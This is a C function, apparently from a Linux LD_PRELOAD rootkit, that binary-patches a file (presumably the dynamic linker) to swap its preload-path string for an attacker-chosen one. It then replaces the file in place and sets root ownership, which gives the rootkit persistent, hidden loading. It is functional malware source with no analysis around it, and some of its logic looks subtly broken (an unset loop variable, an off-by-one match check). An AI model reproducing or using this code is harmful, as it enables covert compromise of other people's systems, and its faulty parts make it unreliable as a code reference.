void ldpatch(const char *path, const char *oldpreload, const char *newpreload, int mode){
    if(strlen(oldpreload) != strlen(newpreload))
        return;

    unsigned char *buf;
    char tmppath[strlen(path)+5];
    FILE *ofp, *nfp;
    off_t fsize;
    size_t n, m;
    struct stat ldstat;
    mode_t ldmode;

    hook(CFOPEN, C__XSTAT, CRENAME, CCHMOD, CFWRITE, CCHOWN);

    ofp = call(CFOPEN, path, "rb"); // open original path.
    if(ofp == NULL) return;

    memset(&ldstat, 0, sizeof(struct stat)); // stat path for size & mode.
    int statstat = (long)call(C__XSTAT, _STAT_VER, path, &ldstat);
    if(statstat < 0){
        fclose(ofp);
        return;
    }

    fsize = ldstat.st_size;
    ldmode = ldstat.st_mode;

    // create & open new tmp path for the target.
    snprintf(tmppath, sizeof(tmppath), "%s.tmp", path);
    nfp = call(CFOPEN, tmppath, "wb");
    if(nfp == NULL){
        fclose(ofp);
        return;
    }

    int count = 0, // when this is strlen(preloadpath) we have a match & have arrived at the end of the string. then we overwrite, from the beginning.
        c = 0;     // position of the curent character in the string that we're writing over the original with.

    buf = malloc(fsize+1);
    memset(buf, 0, fsize+1);

    do{
        n = fread(buf, 1, fsize, ofp);
        if(n){
            for(int i = 0; i != fsize; i++){
                if(buf[i] == oldpreload[count]){
                    if(count == strlen(oldpreload)){ // finally.. we have arrived.
                        for(int x = i-strlen(oldpreload); x < i; x++)
                            memcpy(&buf[x], &newpreload[c++], 1); // 18 memcpys to rule them all
                        break; // we are done here.
                    }

                    // looks like we could be getting closer...
                    count++;
                }else count=0; // reset. buf[i] is not a match.
            }
        }else m = 0;
    }while(n > 0 && n == m);

    fclose(ofp);    // cleanup & write result into the tmp file.
    call(CFWRITE, buf, fsize, 1, nfp);
    free(buf);
    fclose(nfp);

    if((long)call(CRENAME, tmppath, path) != -1){
        if((long)call(CCHMOD, path, ldmode) < 0 && mode == MAGICUSR)
            printf("Chmod failed: %s\n", path);
        else{
            if((long)call(CCHOWN, path, 0, 0) != -1 && mode == MAGICUSR) // oops..
                printf("Patched: \e[1;31m%s\e[0m\n", path);
            else if(mode == MAGICUSR)
                printf("Chown failed: %s\n", path);
        }
    }else if(mode == MAGICUSR) printf("Rename failed: %s -> %s\n", tmppath, path);
}